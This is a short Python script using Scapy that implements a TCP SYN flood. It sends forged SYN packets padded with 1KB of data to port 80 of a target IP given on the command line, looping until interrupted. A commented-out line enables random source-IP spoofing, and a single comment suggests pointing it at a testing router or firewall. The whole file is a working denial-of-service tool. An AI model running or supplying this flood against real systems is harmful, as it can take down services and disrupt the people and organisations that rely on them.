from scapy.all import *
from argparse import ArgumentParser


def main():
    parser = ArgumentParser()
    parser.add_argument('--target-ip', '-tg', help='Target IP address')
    parser.epilog = "Usage: py SYN.py -tg 10.20.30.40"        
    args = parser.parse_args()
    if args.target_ip is not None:
        # target IP address (should be a testing router/firewall)
        target_ip = args.target_ip
        # the target port u want to flood
        target_port = 80
        # forge IP packet with target ip as the destination IP address
        ip = IP(dst=target_ip)
        # or if you want to perform IP Spoofing (will work as well)
        # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
        # forge a TCP SYN packet with a random source port
        # and the target port as the destination port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        # add some flooding data (1KB in this case, don't increase it too much,
        # otherwise, it won't work.)
        raw = Raw(b"X"*1024)
        # stack up the layers
        p = ip / tcp / raw
        # send the constructed packet in a loop until CTRL+C is detected
        send(p, loop=1, verbose=0)
    else:
        print('[-]Please, use --target-ip or -tg to set a Target IP Address!')
        print('[!]Example: -tg 10.20.30.40')
        print('[?] -h for help')
        exit()

main()